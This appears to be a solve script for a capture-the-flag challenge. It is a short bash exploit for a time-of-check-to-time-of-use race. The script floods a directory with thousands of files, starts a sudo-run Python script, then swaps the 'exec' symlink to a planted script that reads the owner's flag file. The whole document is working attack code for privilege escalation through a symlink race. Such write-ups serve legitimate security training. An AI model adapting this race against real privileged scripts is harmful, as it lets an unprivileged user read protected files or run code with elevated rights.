#!/bin/bash

if [[ -f "edata/w1-1" ]] ; then
    >&2 echo "[SOLVE] Skipping files"
else
    >&2 echo "[SOLVE] Making files"
    for i in {1..100} ; do touch edata/w$i-{1..256} ; done # skapa en stor 256-multipel av filer
fi

ls edata | wc -l

if [[ -f 'exec.orig' ]] ; then
    >&2 echo "[SOLVE] Skipping moving"
else
    mv exec exec.orig

    echo -e '#!/bin/bash\necho "fake script" ; cat /home/owner/flag.txt' > exec.new
    chmod 777 exec.new
fi


>&2 echo "[SOLVE] Running"
ln -s exec.orig exec ; echo "hello" | sudo /usr/local/bin/python3 /home/owner/run.py &

sleep 5 ; >&2 echo "[SOLVE] Swapping"
rm exec ; ln -s exec.new exec # toctou!

sleep 10

rm exec
